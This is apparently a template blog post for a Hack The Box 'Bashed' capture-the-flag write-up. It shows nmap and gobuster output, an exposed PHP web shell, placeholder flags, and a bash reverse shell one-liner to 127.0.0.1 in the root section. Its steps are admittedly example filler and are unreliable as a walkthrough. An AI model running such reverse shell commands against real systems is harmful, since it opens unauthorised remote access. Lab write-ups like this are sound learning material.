---
layout: post
title: HTB Bashed 
future: true
---

*Everything below is just random stuff for the sake of example.*

# Recon

## Nmap 
We begin our reconnaissance by running an Nmap scan checking default scripts and checking service versions.

```console
# Nmap 7.80 scan initiated Sat Jun 20 17:04:49 2020 as: nmap -T4 -p0-65535 -sC -sV -oA all 10.10.10.68
Warning: 10.10.10.68 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.68
Host is up (0.054s latency).
Not shown: 65519 closed ports
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
1547/tcp  filtered laplink
7234/tcp  filtered unknown
7468/tcp  filtered unknown
8203/tcp  filtered unknown
11470/tcp filtered unknown
18264/tcp filtered unknown
20445/tcp filtered unknown
20586/tcp filtered unknown
22481/tcp filtered unknown
25357/tcp filtered unknown
38058/tcp filtered unknown
45610/tcp filtered unknown
46819/tcp filtered unknown
55861/tcp filtered unknown
64132/tcp filtered unknown
64346/tcp filtered unknown

```
We can ignore all the filtered ports. The only one we are interested in is the http service on port 80
Lets take a look at the website 

![Github](./images/phpbash.png)


The site gives us a hint as to what kind of technology it is using, however it does not give us too much to work with on it's surface.
We will run gobuster to further enumerate the site.

```console
/images (Status: 301)
/uploads (Status: 301)
/php (Status: 301)
/css (Status: 301)
/dev (Status: 301)
/js (Status: 301)
/fonts (Status: 301)

```
checking the /dev directory gives us access to a php web shell that was displayed on the main site.

![Github](./images/bashed/dev.png)



# Foothold 

Accessing "phpbash.php" gives us access to a webshell. WE can run commands and even get the user flag!

![Github](./images/bashed/webshell.png)




## User Flag

In order to get the user flag, we simply need to use `cat`, because this is a template and not a real writeup!

```
x@wartop:~$ cat user.txt
6u6baafnd3d54fc3b47squhp4e2bhk67
```

## Root Flag

The privilege escalation for this box was not hard, because this is an example and I've got sudo password. Here's some code to call a reverse shell `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`.


![Root](./images/root.png)
\ **Figure 3:** root.txt v5gw5zkh8rr3vmye7p4ka


# Conclusion
In the conclusion sections I like to write a little bit about how the box seemed to me overall, where I struggled, and what I learned.
